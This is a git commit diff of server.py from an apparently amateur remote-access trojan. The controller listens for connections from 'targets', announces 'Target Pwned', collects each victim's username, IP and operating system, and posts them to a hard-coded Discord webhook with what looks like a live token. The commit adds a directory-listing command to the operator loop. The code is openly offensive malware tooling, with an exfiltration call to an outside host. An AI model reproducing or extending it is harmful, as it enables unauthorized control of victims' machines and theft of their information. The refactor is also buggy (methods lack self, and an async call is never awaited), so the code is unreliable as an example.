de68ab8669edcbf3c56ce14158cc1dfc1e7802e9
Jake Peach <112898008+4b3j@users.noreply.github.com>
2022-09-27 11:20:06 -0700

    Update server.py

--- server.py
+++ server.py
@@ -1,15 +1,6 @@
+from xmlrpc.client import Server
 import requests
 import socket
-
-
-s_socket = socket.socket(socket.AF_INET)
-
-
-C_SERVER    =   ""
-C_PORT      =   3334
-
-
-commands = {"help": "Displays information on commands and extras", "user":"Get username of targets machine", "check":"Checks if still connected to target"}
 
 
 o_lo = """
@@ -44,84 +35,103 @@ o_lo = """
 WEBHOOK = "https://discord.com/api/webhooks/1003802181276803073/B64-bPViJY73BRVzJ817gvfLbrPdNw26WPUxfpzumBge_WhSHoYHRpOrQsrHMURgxX34"
 DISCORD_NOTF = False
 
+global C_SERVER
+global C_PORT   
 
-def d_notify(sen):
-  data = {"content": f"{sen}"}
-  res = requests.post(WEBHOOK, json=data, headers={'Content-Type': 'application/json'})
-  if 200 < res.status_code < 299:
-    print("Sent Response")
-  else:
-    print(res.status_code)
+
+# Send data to webhook using discord
+class DiscordNotifyData:
+    async def d_notify(sen):
+        data = {"content": f"{sen}"}
+        res = requests.post(WEBHOOK, json=data, headers={'Content-Type': 'application/json'})
+        if 200 < res.status_code < 299:
+            print("Sent Response")
+        else:
+            print(res.status_code)
  
 
-def on_connect(user, ip, osIn):
-    send_d = f"Connection Success\nFrom {user}\nOn {ip}\nUsing {osIn}"
-    d_notify(send_d)
+class ServerSetup:
+    def __init__(self):
+        self.s_socket:socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.listen_for_clients()
+
+    def on_connect(user, ip, osIn):
+        send_d = f"Connection Success\nFrom {user}\nOn {ip}\nUsing {osIn}"
+        DiscordNotifyData.d_notify(send_d)
 
 
-def bind_and_confirm():
-    # Bind server
-    s_socket.bind((C_SERVER, C_PORT))
-    print("Listen for targets now")
-    # Then listen for a connection
-    s_socket.listen()
+    def listen_for_clients(self):
+        # Bind server
+        self.s_socket.bind((C_SERVER, C_PORT))
+        print("Listen for targets now")
+        # Then listen for a connection
+        self.s_socket.listen()
 
-    # If get a connection accept it 
-    conn, addr = s_socket.accept()
-    print(f"Connection from {addr}")
+        # If get a connection accept it 
+        conn, addr = self.s_socket.accept()
+        print(f"Connection from {addr}")
 
-    # Here it tests if the connection was successful by sending data to target to see if it gets right response that it should
-    conn.send(b"TEST")
-    if conn.recv(1024).decode("UTF-8") == "CONNECTED":
-        print("Target Pwned :)")
-    else:
-        print("TEST FAILED, TRY AGAIN?")
+        # Here it tests if the connection was successful by sending data to target to see if it gets right response that it should
+        conn.send(b"TEST")
+        if conn.recv(1024).decode("UTF-8") == "CONNECTED":
+            print("Target Pwned :)")
+        else:
+            print("TEST FAILED, TRY AGAIN?")
+            return
 
-    # Get user on target
-    conn.send(b"user")
-    user = conn.recv(1024).decode("UTF-8")
-    conn.send(b"ip")
-    ip = conn.recv(1024).decode("UTF-8")
-    conn.send(b"osIn")
-    osIn = conn.recv(1024).decode("UTF-8")
+        # Get user on target
+        conn.send(b"user")
+        user = conn.recv(1024).decode("UTF-8")
+        conn.send(b"ip")
+        ip = conn.recv(1024).decode("UTF-8")
+        conn.send(b"osIn")
+        osIn = conn.recv(1024).decode("UTF-8")
 
-    if user.startswith("Username") == False:
-        user = "Username Error"
-    elif ip.startswith("IP") == False:
-        ip = "IP Error"
-    elif osIn.startswith("Platform") == False:
-        osIn = "Platform Error"
+        if user.startswith("Username") == False:
+            user = "Username Error"
+        elif ip.startswith("IP") == False:
+            ip = "IP Error"
+        elif osIn.startswith("Platform") == False:
+            osIn = "Platform Error"
 
-    # Send data to webhook to notify server 
-    if DISCORD_NOTF == True:
-        on_connect(user, ip, osIn)
+        # Send data to webhook to notify server 
+        if DISCORD_NOTF == True:
+            ServerSetup.on_connect(user, ip, osIn)
 
-    print("Type help for commands")
-    while True:
-        cmd = input("What command would you like to send? ")
+        commands = {"help": "Displays information on commands and extras", "user":"Get username of targets machine", "check":"Checks if still connected to target"}
 
-        cmd.replace(" ", "")
+        print("Type help for commands")
+        while True:
+            cmd = input("What command would you like to send? ")
 
-        if cmd == "help":
-            the_cmd = f"{commands}"
-            print(the_cmd.replace("{", "").replace("}", "").replace(",", "\n"))
-        if cmd == "user":
-            print(user)
-        if cmd == "check":
-            conn.send(b"check")
-            if conn.recv(1024).decode("UTF-8") == "checked":
-                print(f"{ip} Is Still Connected")
-            else:
-                print("Connection failed, please try connecting again!")
-        if cmd == "close":
-            conn.send(b"close")
-            conn.close()
-            print("Connection Closed https://github.com/4b3j Coded")
-            break
+            cmd.replace(" ", "")
+
+            if cmd == "help":
+                the_cmd = f"{commands}"
+                print(the_cmd.replace("{", "").replace("}", "").replace(",", "\n"))
+            if cmd == "user":
+                print(user)
+            if cmd == "check":
+                conn.send(b"check")
+                if conn.recv(1024).decode("UTF-8") == "checked":
+                    print(f"{ip} Is Still Connected")
+                else:
+                    print("Connection failed, please try connecting again!")
+                    break
+            if cmd == "close":
+                conn.send(b"close")
+                conn.close()
+                print("Connection Closed https://github.com/4b3j Coded")
+                break
+            if cmd == "listdir":
+                conn.send(b"listdir")
+                print(f"{conn.recv(1024).decode('UTF-8')}")
             
 
 
 if __name__ == "__main__":
+    C_SERVER    = "127.0.0.1"
+    C_PORT      = 3334 
     print(o_lo)
-    print("                                                 Welcome User                ")
-    bind_and_confirm()
+    print("                                                 Welcome User                  ")
+    ServerSetup()
